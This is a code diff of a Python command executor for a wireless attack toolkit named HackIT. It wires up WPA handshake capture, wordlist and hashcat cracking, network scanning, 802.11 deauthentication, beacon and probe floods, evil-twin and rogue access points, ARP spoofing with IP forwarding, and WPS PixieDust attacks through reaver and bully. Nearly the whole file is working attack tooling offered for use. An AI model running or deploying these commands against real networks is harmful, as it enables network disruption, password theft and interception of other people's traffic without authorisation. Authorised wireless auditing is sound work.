+                    _console.print(f"  {line}")
+            proc.wait()
+            if os.path.exists(output):
+                UI.print_success(f"Handshake saved: {output}")
+            else:
+                UI.print_warning(f"No handshake captured in {timeout}s. Try closer range or deauth.")
+        except KeyboardInterrupt:
+            proc.terminate()
+            UI.print_warning("Handshake capture stopped.")
+
+    def do_sessions(self, json_output: bool = False, **kwargs):
+        patterns = [
+            str(BASE / "handshakes" / "*.pcap"),
+            str(BASE / "captures" / "*.pcap"),
+            str(BASE / "*.pcap"),
+        ]
+        pcap_files = []
+        for p in patterns:
+            pcap_files.extend(glob.glob(p))
+
         if not pcap_files:
-            UIRenderer.print_warning("No capture sessions found in handshakes/ or captures/ directories.")
+            UI.print_warning("No capture sessions found.")
             return
-        table = Table(title="Stored Capture Sessions", title_style="bold cyan")
+
+        table = Table(title="[bold cyan]Capture Sessions[/bold cyan]", border_style="cyan")
         table.add_column("File", style="cyan")
         table.add_column("Size", justify="right", style="green")
         table.add_column("Modified", style="dim")
-        import datetime
+        table.add_column("Handshakes", justify="center", style="yellow")
+        table.add_column("Status", style="white")
+
         for f in sorted(pcap_files):
             stat = os.stat(f)
+            hs_count = len(DataParser.parse_tshark_handshake(f))
+            status = "[bold green]✓ Valid[/bold green]" if hs_count > 0 else "[dim]No EAPOL[/dim]"
             table.add_row(
                 os.path.basename(f),
-                f"{stat.st_size:,} bytes",
-                datetime.datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M")
+                f"{stat.st_size:,} B",
+                dt.datetime.fromtimestamp(stat.st_mtime).strftime("%H:%M:%S"),
+                str(hs_count),
+                status,
             )
         _console.print(table)
 
-    # ─────────────────────────────────────────────────────────────
-    # PHASE 3: WPA/WPA2 Audit
-    # ─────────────────────────────────────────────────────────────
+    def do_replay(self, pcap_file: str, loop: bool = False, speed: int = 1, bpf: Optional[str] = None, count: int = 0, **kwargs):
+        if not os.path.exists(pcap_file):
+            UI.print_error(f"File not found: {pcap_file}")
+            return
+        if shutil.which("wireshark"):
+            subprocess.Popen(["wireshark", "-r", pcap_file])
+            UI.print_success(f"Opening {pcap_file} in Wireshark...")
+        elif shutil.which("tshark"):
+            UI.print_info(f"Analyzing {pcap_file} with tshark...")
+            result = subprocess.run(["tshark", "-r", pcap_file, "-Y", "eapol || wlan.fc.type_subtype==8 || wlan.fc.type_subtype==4",
+                                     "-T", "fields", "-e", "frame.number", "-e", "wlan.sa", "-e", "wlan.da",
+                                     "-e", "wlan.fc.type_subtype"], capture_output=True, text=True)
+            _console.print(Panel(result.stdout[:3000] or result.stderr[:1000] or "No output",
+                                 title="[bold]PCAP Analysis[/bold]", border_style="blue"))
+        else:
+            UI.print_warning("Install Wireshark or tshark to replay/analyze captures.")
 
-    def run_crack(self, hashfile: str, wordlist: str):
-        """Dictionary-based WPA crack dispatched to Go Worker"""
-        UIRenderer.print_success(f"Dispatching Go Worker: crack {hashfile} with {wordlist}")
+    # ════════════════════════════════════════════════════════════
+    # PHASE 3: WPA/WPA2/WPA3 Audit
+    # ════════════════════════════════════════════════════════════
+
+    def do_crack(self, hashfile: str, wordlist: str, rules: Optional[str] = None, timeout: int = 0, session: Optional[str] = None, **kwargs):
         if not os.path.exists(hashfile):
-            UIRenderer.print_error(f"Hash file not found: {hashfile}")
+            UI.print_error(f"Hash file not found: {hashfile}")
             return
         if not os.path.exists(wordlist):
-            UIRenderer.print_error(f"Wordlist not found: {wordlist}")
+            UI.print_error(f"Wordlist not found: {wordlist}")
             return
+
         try:
-            process = self.bridge.launch_go_crack(hashfile, wordlist)
-            process.wait()
-        except KeyboardInterrupt:
-            UIRenderer.print_warning("Crack aborted.")
-            process.terminate()
-
-    def do_verify(self, capture_file: str):
-        """Verify EAPOL handshake integrity via Rust Engine"""
-        UIRenderer.print_success(f"Verifying handshake in: {capture_file}")
-        if not self.bridge.check_engine_health():
-            UIRenderer.print_error("Rust Engine missing.")
+            proc = self.bridge.go_crack(hashfile, wordlist)
+        except EngineBuildError as e:
+            UI.print_error(str(e))
             return
-        cmd = [self.bridge.rust_engine_path, "verify", "--capture", capture_file]
-        result = subprocess.run(cmd, capture_output=True, text=True)
-        _console.print(result.stdout or result.stderr)
 
-    def do_hashcat(self, hashfile: str, wordlist: str):
-        """Launch external hashcat session"""
-        hashcat_bin = "hashcat"
-        if not _which(hashcat_bin):
-            UIRenderer.print_error("hashcat not found in PATH. Install it first.")
-            return
-        cmd = [hashcat_bin, "-m", "22000", hashfile, wordlist, "--force", "--status"]
-        UIRenderer.print_success(f"Launching hashcat: {' '.join(cmd)}")
+        jid = self.jobs.start(f"crack-{os.path.basename(hashfile)}", proc)
+        UI.print_success(f"Crack job {jid} started.")
+
+        total = 0
         try:
-            subprocess.run(cmd)
-        except KeyboardInterrupt:
-            UIRenderer.print_warning("Hashcat stopped.")
+            with open(wordlist) as f:
+                total = sum(1 for _ in f)
+        except Exception:
+            total = 0
 
-    def do_wordlists(self):
-        """List installed wordlists"""
-        import glob
+        start = time.time()
+        try:
+            for line in proc.stdout:
+                line = line.strip()
+                if not line:
+                    continue
+                data = DataParser.parse_telemetry(line)
+                if data and data.get("event") == "crack_progress":
+                    tested = data.get("tested", 0)
+                    rate = data.get("rate", 0)
+                    elapsed = time.time() - start
+                    panel = UI.render_crack_progress(tested, total or 1, rate, "", elapsed)
+                    _console.clear()
+                    _console.print(panel)
+                elif data and data.get("event") == "key_found":
+                    UI.print_success(f"KEY FOUND: {data['key']}")
+                else:
+                    _console.print(f"  {line}")
+            proc.wait()
+        except KeyboardInterrupt:
+            proc.terminate()
+            UI.print_warning("Crack interrupted.")
+        finally:
+            elapsed = time.time() - start
+            UI.print_info(f"Crack job completed in {elapsed:.1f}s")
+
+    def do_hashcat(self, hashfile: str, wordlist: str, extra_args: str = ""):
+        if not shutil.which("hashcat"):
+            UI.print_error("hashcat not found. Install it first.")
+            return
+        if not os.path.exists(hashfile):
+            UI.print_error(f"Hash file not found: {hashfile}")
+            return
+        cmd = ["hashcat", "-m", "22000", hashfile, wordlist, "--force", "--status", "--status-timer=1"]
+        if extra_args:
+            cmd.extend(shlex.split(extra_args))
+        UI.print_success(f"hashcat: {' '.join(cmd)}")
+        proc = subprocess.Popen(cmd)
+        jid = self.jobs.start("hashcat", proc)
+        UI.print_info(f"hashcat job {jid} running in background.")
+        try:
+            proc.wait()
+        except KeyboardInterrupt:
+            proc.terminate()
+            UI.print_warning("hashcat stopped.")
+
+    def do_verify(self, capture_file: str, json_output: bool = False, strict: bool = False, output: Optional[str] = None, **kwargs):
+        if not os.path.exists(capture_file):
+            UI.print_error(f"File not found: {capture_file}")
+            return
+        result = self.bridge.rust_verify(capture_file)
+        if result.returncode == 0:
+            UI.print_success(result.stdout or "Handshake valid.")
+        else:
+            UI.print_error(result.stderr or "Verification failed.")
+
+    def do_convert_hc22000(self, capture_file: str, ssid: Optional[str] = None, bssid: Optional[str] = None, output: Optional[str] = None, **kwargs):
+        if not os.path.exists(capture_file):
+            UI.print_error(f"File not found: {capture_file}")
+            return
+        result = self.bridge.rust_convert_hc22000(capture_file)
+        if result.returncode == 0:
+            UI.print_success(result.stdout or "Conversion complete.")
+        else:
+            UI.print_error(result.stderr or "Conversion failed.")
+
+    def do_convert_hccapx(self, capture_file: str, output: Optional[str] = None, **kwargs):
+        UI.print_info("HCCAPX conversion not yet implemented.")
+
+    def do_convert_csv(self, capture_file: str, output: Optional[str] = None, **kwargs):
+        UI.print_info("CSV conversion not yet implemented.")
+
+    def do_wordlists(self, search_path: str = "", show_size: bool = False, json_output: bool = False, **kwargs):
         candidates = [
+            search_path,
             "/usr/share/wordlists",
             "/usr/share/dict",
-            os.path.join(os.path.dirname(__file__), "..", "..", "wordlists"),
-            "C:/Tools/wordlists"
+            str(Path.home() / "wordlists"),
+            str(BASE / ".." / ".." / "wordlists"),
         ]
-        table = Table(title="Installed Wordlists", title_style="bold cyan")
-        table.add_column("File", style="cyan")
+        table = Table(title="[bold cyan]Wordlists Found[/bold cyan]", border_style="cyan")
+        table.add_column("Path", style="cyan")
         table.add_column("Size", justify="right", style="green")
+        table.add_column("Lines", justify="right", style="yellow")
         found = False
         for base in candidates:
-            for f in glob.glob(os.path.join(base, "*.txt")) + glob.glob(os.path.join(base, "*.lst")):
-                stat = os.stat(f)
-                table.add_row(f, f"{stat.st_size:,} bytes")
+            if not base:
+                continue
+            for f in glob.glob(os.path.join(base, "*")):
+                if not os.path.isfile(f):
+                    continue
+                size = os.path.getsize(f)
+                try:
+                    with open(f, errors="ignore") as fh:
+                        lines = sum(1 for _ in fh)
+                except Exception:
+                    lines = 0
+                table.add_row(f, f"{size:,} B", f"{lines:,}")
                 found = True
         if not found:
-            UIRenderer.print_warning("No wordlists found. Common location: /usr/share/wordlists/")
+            UI.print_warning("No wordlists found. Install rockyou.txt or similar.")
             return
         _console.print(table)
 
-    def do_convert_hc22000(self, capture_file: str):
-        """Convert PCAP to Hashcat HC22000 format via Rust Engine"""
-        UIRenderer.print_success(f"Converting {capture_file} to HC22000 format...")
-        if not self.bridge.check_engine_health():
-            UIRenderer.print_error("Rust Engine missing.")
+    # ════════════════════════════════════════════════════════════
+    # PHASE 4: Network Recon
+    # ════════════════════════════════════════════════════════════
+
+    def do_arp_scan(self, timeout: int = 10, iface: Optional[str] = None, **kwargs):
+        subnet = self._detect_subnet()
+        if not subnet:
+            UI.print_error("Could not detect subnet. Specify one.")
             return
-        out_file = capture_file.replace(".pcap", ".hc22000")
-        cmd = [self.bridge.rust_engine_path, "convert", "--input", capture_file, "--output", out_file]
-        result = subprocess.run(cmd, capture_output=True, text=True)
-        if result.returncode == 0:
-            UIRenderer.print_success(f"Saved to: {out_file}")
+        UI.print_info(f"ARP scanning {subnet}...")
+        try:
+            proc = self.bridge.rust_arp_scan(subnet)
+        except EngineBuildError:
+            UI.print_error("Rust engine not built. Use Python fallback.")
+            self._arp_scan_fallback(subnet)
+            return
+
+        table = Table(title=f"[bold cyan]ARP Scan: {subnet}[/bold cyan]", border_style="green")
+        table.add_column("IP", style="cyan")
+        table.add_column("MAC", style="yellow")
+        table.add_column("Vendor", style="white")
+        table.add_column("Hostname", style="dim")
+        try:
+            for line in proc.stdout:
+                data = DataParser.parse_telemetry(line.strip())
+                if data and data.get("event") == "host":
+                    table.add_row(data["ip"], data["mac"], UI._oui_lookup(data["mac"]), data.get("hostname", ""))
+            proc.wait()
+            _console.print(table)
+        except KeyboardInterrupt:
+            proc.terminate()
+
+    def _arp_scan_fallback(self, subnet: str):
+        if shutil.which("arp-scan"):
+            subprocess.run(["arp-scan", subnet])
+        elif shutil.which("arping"):
+            base = subnet.rsplit(".", 1)[0]
+            for i in range(1, 255):
+                ip = f"{base}.{i}"
+                subprocess.run(["arping", "-c", "1", "-w", "1", ip], capture_output=True)
         else:
-            UIRenderer.print_error(result.stderr or "Conversion failed.")
+            import scapy.all as scapy
+            try:
+                ans, _ = scapy.arping(subnet, timeout=2, verbose=False)
+                for s, r in ans:
+                    _console.print(f"  {r.psrc:<16} {r.hwsrc}")
+            except Exception as e:
+                UI.print_error(f"Scapy ARP failed: {e}")
 
-    # ─────────────────────────────────────────────────────────────
-    # PHASE 4: Network Recon & Enumeration
-    # ─────────────────────────────────────────────────────────────
+    def do_ping_sweep(self, subnet: str = "", timeout: int = 5, parallel: int = 10, output: Optional[str] = None, **kwargs):
+        subnet = subnet or self._detect_subnet()
+        if not subnet:
+            UI.print_error("Specify subnet or use 'arp scan'.")
+            return
+        UI.print_info(f"Ping sweeping {subnet}...")
+        base = subnet.rsplit(".", 1)[0]
+        alive = []
+        with Progress(SpinnerColumn(), TextColumn("[bold cyan]{task.description}"), console=_console) as p:
+            task = p.add_task(f"Pinging {base}.1-254...", total=254)
+            for i in range(1, 255):
+                ip = f"{base}.{i}"
+                ret = subprocess.run(["ping", "-c", "1", "-W", "1", ip], capture_output=True, text=True)
+                if ret.returncode == 0:
+                    alive.append(ip)
+                p.update(task, advance=1)
+        if alive:
+            UI.print_success(f"Alive hosts: {len(alive)}")
+            for ip in alive:
+                _console.print(f"  [green]{ip}[/green]")
+        else:
+            UI.print_warning("No alive hosts found.")
 
-    def do_arp_scan(self, subnet: str = ""):
-        """ARP scan the local subnet with real-time subnet detection"""
-        if not subnet:
-            subnet = self._get_local_subnet()
-        if not subnet:
-            UIRenderer.print_error("Could not detect local subnet. Specify: arp-scan <subnet>")
-            return
-        UIRenderer.print_success(f"ARP Scanning: {subnet}")
-        if not self.bridge.check_engine_health():
-            UIRenderer.print_error("Rust Engine missing.")
-            return
-        cmd = [self.bridge.rust_engine_path, "arp-scan", "--subnet", subnet]
-        table = Table(title=f"ARP Scan: {subnet}", title_style="bold cyan")
-        table.add_column("IP",       style="cyan")
-        table.add_column("MAC",      style="yellow")
-        table.add_column("Hostname", style="white")
-        table.add_column("Latency",  justify="right", style="green")
+    def do_port_scan(self, host: str, ports: str = "1-1024", timeout: int = 2000, threads: int = 50, top_ports: int = 0, service_detect: bool = False, scan_type: str = "syn", output: Optional[str] = None, **kwargs):
         try:
-            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, text=True)
-            with Live(table, refresh_per_second=4):
-                for line in proc.stdout:
-                    # [RUST-RECON] HOST: ip=... mac=... hostname=... latency=...ms
-                    if "[RUST-RECON] HOST:" in line:
-                        parts = _kv_parse(line)
-                        table.add_row(
-                            parts.get("ip", "?"),
-                            parts.get("mac", "N/A"),
-                            parts.get("hostname", "N/A"),
-                            parts.get("latency", "?")
-                        )
-            proc.wait()
-        except KeyboardInterrupt:
-            proc.terminate()
-
-    def do_ping_sweep(self, subnet: str):
-        """ICMP host discovery sweep"""
-        self.do_arp_scan(subnet)
-
-    def do_ports(self, host: str):
-        """Fast TCP port scan"""
-        UIRenderer.print_success(f"Port scanning: {host}")
-        if not self.bridge.check_engine_health():
-            UIRenderer.print_error("Rust Engine missing.")
+            proc = self.bridge.rust_port_scan(host, ports)
+        except EngineBuildError:
+            self._port_scan_fallback(host, ports)
             return
-        cmd = [self.bridge.rust_engine_path, "port-scan", "--host", host]
-        table = Table(title=f"Port Scan: {host}", title_style="bold cyan")
-        table.add_column("Port",    justify="right", style="yellow", width=8)
+        table = Table(title=f"[bold cyan]Port Scan: {host}[/bold cyan]", border_style="cyan")
+        table.add_column("Port", justify="right", style="yellow", width=8)
         table.add_column("Service", style="cyan")
-        table.add_column("Status",  style="green")
+        table.add_column("Status", style="green")
         try:
-            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, text=True)
-            with Live(table, refresh_per_second=4):
-                for line in proc.stdout:
-                    if "[RUST-SCAN] PORT OPEN:" in line:
-                        # format: [RUST-SCAN] PORT OPEN: host:port
-                        part = line.split("PORT OPEN:")[-1].strip()
-                        port_str = part.split(":")[-1].strip()
-                        svc = _svc_name(int(port_str)) if port_str.isdigit() else "Unknown"
-                        table.add_row(port_str, svc, "[bold green]OPEN[/bold green]")
+            for line in proc.stdout:
+                data = DataParser.parse_telemetry(line.strip())
+                if data and data.get("event") == "port_open":
+                    target = data["target"]
+                    port = target.split(":")[-1] if ":" in target else target
+                    svc = self._svc_name(int(port)) if port.isdigit() else "?"
+                    table.add_row(port, svc, "[bold green]OPEN[/bold green]")
             proc.wait()
+            _console.print(table)
         except KeyboardInterrupt:
             proc.terminate()
 
-    def do_services(self, host: str):
-        """Detect services on open ports"""
-        self.do_ports(host)  # Port scan + banner grab
+    def _port_scan_fallback(self, host: str, ports: str = "1-1024"):
+        UI.print_warning("Using Python fallback scanner (slow).")
+        start_port, end_port = 1, 1024
+        if "-" in ports:
+            sp, ep = ports.split("-")
+            start_port, end_port = int(sp), int(ep)
+        from concurrent.futures import ThreadPoolExecutor
+        import socket
+        results = []
+        def chk(port):
+            s = socket.socket()
+            s.settimeout(1)
+            if s.connect_ex((host, port)) == 0:
+                results.append(port)
+            s.close()
+        with ThreadPoolExecutor(max_workers=100) as ex:
+            ex.map(chk, range(start_port, end_port + 1))
+        if results:
+            table = Table(title=f"[bold cyan]Open Ports: {host}[/bold cyan]", border_style="cyan")
+            table.add_column("Port", style="yellow")
+            table.add_column("Service", style="cyan")
+            for p in sorted(results):
+                table.add_row(str(p), self._svc_name(p))
+            _console.print(table)
+        else:
+            UI.print_warning("No open ports found.")
 
-    def do_osdetect(self, host: str):
-        """OS fingerprinting"""
-        UIRenderer.print_success(f"OS Fingerprinting: {host}")
-        if not self.bridge.check_engine_health():
-            UIRenderer.print_error("Rust Engine missing.")
+    def do_os_detect(self, host: str, timeout: int = 30, aggressive: bool = False, output: Optional[str] = None, **kwargs):
+        UI.print_info(f"OS fingerprinting {host}...")
+        try:
+            result = self.bridge.rust_os_detect(host)
+        except EngineBuildError:
+            UI.print_error("Rust engine not built.")
             return
-        cmd = [self.bridge.rust_engine_path, "osdetect", "--host", host]
-        result = subprocess.run(cmd, capture_output=True, text=True)
-        _console.print(result.stdout or result.stderr or "[!] No response from host.")
+        _console.print(result.stdout or "[dim]No response[/dim]")
 
-    def do_gateway(self):
-        """Show active network gateway"""
+    def do_services(self, host: str, timeout: int = 3000, threads: int = 20, output: Optional[str] = None, **kwargs):
+        self.do_port_scan(host, "1-10000")
+
+    def do_gateway(self, ipv6: bool = False, **kwargs):
         try:
             if os.name == "nt":
                 out = subprocess.check_output("ipconfig", text=True)
                 for line in out.splitlines():
-                    if "Default Gateway" in line and line.strip().endswith(("0.1","1.1","0.254")):
-                        _console.print(f"  [bold cyan]Gateway:[/bold cyan] {line.split(':')[-1].strip()}")
+                    if "Default Gateway" in line:
+                        gw = line.split(":")[-1].strip()
+                        _console.print(f"  [bold cyan]Gateway:[/bold cyan] {gw}")
                         return
             else:
                 out = subprocess.check_output(["ip", "route"], text=True)
                 for line in out.splitlines():
                     if line.startswith("default"):
-                        _console.print(f"  [bold cyan]Gateway:[/bold cyan] {line.split()[2]}")
+                        gw = line.split()[2]
+                        _console.print(f"  [bold cyan]Gateway:[/bold cyan] {gw}")
                         return
-            UIRenderer.print_warning("Gateway not found.")
         except Exception as e:
-            UIRenderer.print_error(str(e))
+            UI.print_error(str(e))
 
-    # ─────────────────────────────────────────────────────────────
+    # ════════════════════════════════════════════════════════════
     # PHASE 5: MITM & Wireless Attacks
-    # ─────────────────────────────────────────────────────────────
+    # ════════════════════════════════════════════════════════════
 
-    def do_deauth(self, iface: str, bssid: str, station: str = "", count: int = 10):
-        """Send raw 802.11 deauth frames via Rust Engine. Station broadcasts if not specified."""
-        if not station:
-            station = BROADCAST_MAC
-        UIRenderer.print_success(f"Deauth → {iface}: BSSID={bssid} Station={station} x{count}")
-        if not self.bridge.check_engine_health():
-            UIRenderer.print_error("Rust Engine missing.")
-            return
-        cmd = [self.bridge.rust_engine_path, "deauth",
-               "--interface", iface, "--bssid", bssid, "--station", station, "--count", str(count)]
-        result = subprocess.run(cmd, capture_output=True, text=True)
-        _console.print(result.stdout or result.stderr)
-
-    def do_beacon_flood(self, iface: str, ssid: str = "", count: int = 50):
-        """Broadcast fake beacon frames. SSID auto-generated if not specified."""
-        if not ssid:
-            import time
-            ssid = f"HackIT_{int(time.time() * 1000) % 10000}"
-        UIRenderer.print_success(f"Beacon flood on {iface}: {count} x '{ssid}'")
-        if not self.bridge.check_engine_health():
-            UIRenderer.print_error("Rust Engine missing.")
-            return
-        cmd = [self.bridge.rust_engine_path, "beacon-flood",
-               "--interface", iface, "--ssid", ssid, "--count", str(count)]
+    def do_deauth(self, iface: str, bssid: str, station: str = "", count: int = 10, reason: int = 7, channel: int = 0, output: Optional[str] = None, interval: int = 100, **kwargs):
+        iface = iface or self._default_iface()
+        station = station or BROADCAST_MAC
         try:
-            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, text=True)
+            proc = self.bridge.rust_deauth(iface, bssid, station, count, reason)
+        except EngineBuildError as e:
+            UI.print_error(str(e))
+            return
+        UI.print_info(f"Deauth: {iface} → {bssid} → {station} x{count} (reason={reason})")
+        for line in proc.stdout:
+            l = line.strip()
+            if l:
+                _console.print(f"  {l}")
+        proc.wait()
+
+    def do_beacon_flood(self, iface: str, ssid: str = "", count: int = 50, channel: int = 6, caps: Optional[str] = None, **kwargs):
+        iface = iface or self._default_iface()
+        if not ssid:
+            ssid = f"HackIT_{int(time.time() * 1000) % 10000:04d}"
+        try:
+            proc = self.bridge.rust_beacon_flood(iface, ssid, count, channel)
+        except EngineBuildError as e:
+            UI.print_error(str(e))
+            return
+        UI.print_info(f"Beacon flood: {iface} '{ssid}' x{count} on ch {channel}")
+        for line in proc.stdout:
+            l = line.strip()
+            if l:
+                _console.print(f"  {l}")
+        proc.wait()
+
+    def do_probe_flood(self, iface: str, count: int = 100, interval: int = 50, random_mac: bool = False, **kwargs):
+        iface = iface or self._default_iface()
+        try:
+            proc = self.bridge.rust_probe_flood(iface, count)
+        except EngineBuildError as e:
+            UI.print_error(str(e))
+            return
+        UI.print_info(f"Probe flood: {iface} x{count}")
+        for line in proc.stdout:
+            l = line.strip()
+            if l:
+                _console.print(f"  {l}")
+        proc.wait()
+
+    def do_eviltwin(self, iface: str, ssid: str, channel: int = 6, caps: Optional[str] = None, captive: bool = False, bssid: Optional[str] = None, dhcp_range: Optional[str] = None, **kwargs):
+        if not ssid:
+            UI.print_error("Specify SSID to clone.")
+            return
+        iface = iface or self._default_iface()
+        UI.print_info(f"Evil Twin: cloning '{ssid}' on {iface} ch {channel}")
+        UI.print_info("Sending beacon frames with cloned SSID...")
+        self.do_beacon_flood(iface, ssid, 100, channel)
+        UI.print_info("Set up a DHCP server and AP on the same channel for full rogue AP.")
+
+    def do_rogue_ap(self, iface: str, ssid: str = "FreeWiFi", channel: int = 6, wpa2: bool = False, captive: bool = False, bssid: Optional[str] = None, dhcp_range: Optional[str] = None, **kwargs):
+        UI.print_info(f"Starting rogue AP '{ssid}' on {iface} ch {channel}...")
+        self.do_beacon_flood(iface, ssid, 500, channel)
+        UI.print_info("Rogue AP beaconing active. Set up hostapd + dnsmasq for full functionality.")
+
+    def do_arp_spoof(self, target: str, gateway: str, timeout: int = 0, interval: int = 2, full_duplex: bool = False, output: Optional[str] = None, **kwargs):
+        UI.print_info(f"ARP spoof: {target} ↔ {gateway}")
+        try:
+            proc = self.bridge.rust_arp_spoof(target, gateway)
+        except EngineBuildError as e:
+            UI.print_error(str(e))
+            return
+        jid = self.jobs.start(f"arp-spoof-{target}", proc)
+        UI.print_info(f"ARP spoof job {jid} running (Ctrl+C to stop)...")
+        try:
             for line in proc.stdout:
-                _console.print(f"  {line.rstrip()}")
+                l = line.strip()
+                if l:
+                    _console.print(f"  {l}")
             proc.wait()
         except KeyboardInterrupt:
-            UIRenderer.print_warning("Beacon flood stopped.")
-
-    def do_arp_spoof(self, target: str, gateway: str):
-        """ARP poisoning via Go Worker"""
-        UIRenderer.print_success(f"ARP Spoofing: target={target} gateway={gateway}")
-        go_bin = self._go_binary()
-        if not go_bin:
-            UIRenderer.print_error("Go Worker binary missing.")
-            return
-        try:
-            proc = subprocess.Popen([go_bin, "arp-spoof", target, gateway],
-                                    stdout=subprocess.PIPE, text=True)
-            for line in proc.stdout:
-                _console.print(f"  {line.rstrip()}")
-        except KeyboardInterrupt:
             proc.terminate()
-            UIRenderer.print_warning("ARP spoofing stopped.")
+            UI.print_warning("ARP spoof stopped.")
 
-    def do_forward(self, state: str):
-        """Enable/disable IP packet forwarding"""
+    def do_forward(self, state: str, persist: bool = False, **kwargs):
         enable = state.lower() in ("on", "enable", "1", "true")
-        UIRenderer.print_success(f"Packet forwarding: {'ENABLED' if enable else 'DISABLED'}")
         try:
             if os.name == "nt":
                 val = "1" if enable else "0"
@@ -537,289 +1063,354 @@ class HackITWirelessExecutor:
                     r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                     "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", val, "/f"], check=True)
             else:
-                val = "1" if enable else "0"
                 with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
-                    f.write(val)
-            UIRenderer.print_success("Done.")
+                    f.write("1\n" if enable else "0\n")
+            UI.print_success(f"Forwarding {'ENABLED' if enable else 'DISABLED'}.")
         except Exception as e:
-            UIRenderer.print_error(str(e))
+            UI.print_error(str(e))
 
-    # ─────────────────────────────────────────────────────────────
-    # PHASE 6: Automation
-    # ─────────────────────────────────────────────────────────────
+    # ════════════════════════════════════════════════════════════
+    # PHASE 6: WPS/WEP/PWKID
+    # ════════════════════════════════════════════════════════════
 
-    def do_auto_handshake(self, iface: str):
-        """Automated handshake capture with deauth + capture loop"""
-        UIRenderer.print_success("Auto Handshake Capture starting...")
-        UIRenderer.print_success("Step 1/3: Scanning networks...")
-        aps = self._scan_realtime_networks()
-        if not aps:
-            UIRenderer.print_warning("No APs found in range.")
-            return
-        UIRenderer.print_success(f"Step 2/3: Found {len(aps)} AP(s). EAPOL harvest...")
-        for ap in aps[:5]:
-            bssid = ap.get("bssid", "")
-            ssid  = ap.get("ssid", "")
-            if not bssid or "Open" in ap.get("encrypt", ""):
-                continue
-            UIRenderer.print_success(f"  Targeting: {ssid} [{bssid}]")
-            self.do_handshake_capture(iface, bssid, f"handshake_{bssid.replace(':','')}.pcap", 20)
-        UIRenderer.print_success("Step 3/3: Handshake harvest complete.")
-
-    def do_jobs(self):
-        """List background jobs"""
-        UIRenderer.print_warning("Background job tracking will be available in Phase 7.")
-
-    def do_stop_all(self):
-        """Stop all running background modules"""
-        UIRenderer.print_warning("Sending SIGTERM to all child processes...")
-        os.system("taskkill /F /IM hackit_wireless_engine.exe 2>nul" if os.name == "nt"
-                  else "pkill -f hackit_wireless_engine")
-        UIRenderer.print_success("Done.")
-
-    # ─────────────────────────────────────────────────────────────
-    # PHASE 7: New Rust Engine Commands
-    # ─────────────────────────────────────────────────────────────
-
-    def do_aggressive_scan(self, iface: str):
-        """Multi-channel aggressive AP scan via Rust Engine"""
-        UIRenderer.print_success(f"Aggressive scan on {iface}...")
-        if not self.bridge.check_engine_health():
-            UIRenderer.print_error("Rust Engine missing.")
-            return
-        cmd = [self.bridge.rust_engine_path, "aggressive-scan", "--interface", iface]
-        result = subprocess.run(cmd, capture_output=True, text=True)
-        _console.print(result.stdout or result.stderr)
-
-    def do_client_hunt(self, iface: str, bssid: str = ""):
-        """Client enumeration via Rust Engine"""
-        UIRenderer.print_success(f"Client hunt on {iface}...")
-        if not self.bridge.check_engine_health():
-            UIRenderer.print_error("Rust Engine missing.")
-            return
-        cmd = [self.bridge.rust_engine_path, "client-hunt", "--interface", iface]
-        if bssid:
-            cmd.extend(["--bssid", bssid])
-        result = subprocess.run(cmd, capture_output=True, text=True)
-        _console.print(result.stdout or result.stderr)
-
-    def do_wpa3_detect(self, iface: str):
-        """WPA3/SAE AP detection via Rust Engine"""
-        UIRenderer.print_success(f"WPA3 detection on {iface}...")
-        if not self.bridge.check_engine_health():
-            UIRenderer.print_error("Rust Engine missing.")
-            return
-        cmd = [self.bridge.rust_engine_path, "wpa3-detect", "--interface", iface]
-        result = subprocess.run(cmd, capture_output=True, text=True)
-        _console.print(result.stdout or result.stderr)
-
-    def do_probe_flood(self, iface: str, count: int = 100):
-        """Probe request flood via Rust Engine"""
-        UIRenderer.print_success(f"Probe flood on {iface} ({count} frames)...")
-        if not self.bridge.check_engine_health():
-            UIRenderer.print_error("Rust Engine missing.")
-            return
-        cmd = [self.bridge.rust_engine_path, "probe-flood", "--interface", iface, "--count", str(count)]
-        result = subprocess.run(cmd, capture_output=True, text=True)
-        _console.print(result.stdout or result.stderr)
-
-    # ─────────────────────────────────────────────────────────────
-    # PHASE 8: WPS & WEP Attacks
-    # ─────────────────────────────────────────────────────────────
-
-    def do_wps_scan(self, iface: str):
-        """Scan for WPS-enabled APs using wash"""
-        wash_bin = _which("wash")
-        if wash_bin:
-            UIRenderer.print_success(f"Scanning WPS APs on {iface} via wash...")
+    def do_wps_scan(self, iface: str, timeout: int = 30, output: Optional[str] = None, **kwargs):
+        iface = iface or self._default_iface()
+        if shutil.which("wash"):
+            UI.print_info(f"WPS scan via wash on {iface}...")
             subprocess.run(["wash", "-i", iface])
             return
+        try:
+            proc = self.bridge.rust_wps_scan(iface)
+            for line in proc.stdout:
+                _console.print(f"  {line.strip()}")
+            proc.wait()
+        except EngineBuildError:
+            UI.print_warning("wash not found and Rust engine missing.")
+            UI.print_info("Install wash (apt install reaver) or build the Rust engine.")
 
-        UIRenderer.print_warning("wash not found. Scanning via iw/list_networks...")
-        aps = self._scan_realtime_networks()
-        table = Table(title="WPS-Enabled Networks (scan)", title_style="bold cyan")
-        table.add_column("SSID", style="white")
-        table.add_column("BSSID", style="cyan")
-        table.add_column("Signal", style="green")
-        table.add_column("Crypto", style="red")
-        for ap in aps:
-            table.add_row(ap.get("ssid", "?"), ap.get("bssid", "?"), ap.get("signal", "?"), ap.get("encrypt", "?"))
+    def do_wps_pixie(self, iface: str, bssid: str, pin: str = "", timeout: int = 120, **kwargs):
+        iface = iface or self._default_iface()
+        if not bssid:
+            UI.print_error("Specify BSSID.")
+            return
+        if shutil.which("reaver"):
+            cmd = ["reaver", "-i", iface, "-b", bssid, "-K", "-vv"]
+            if pin:
+                cmd.extend(["-p", pin])
+            UI.print_info(f"reaver PixieDust attack on {bssid}...")
+            subprocess.run(cmd)
+        elif shutil.which("bully"):
+            cmd = ["bully", "-b", bssid, "-d", iface, "-F", "-B", "-T"]
+            if pin:
+                cmd.extend(["-p", pin])
+            UI.print_info(f"bully PixieDust attack on {bssid}...")
+            subprocess.run(cmd)
+        else:
+            try:
+                proc = self.bridge.rust_wps_pixie(iface, bssid, pin)
+                for line in proc.stdout:
+                    _console.print(f"  {line.strip()}")
+                proc.wait()
+            except EngineBuildError:
+                UI.print_error("No WPS tools available. Install reaver or bully.")
+
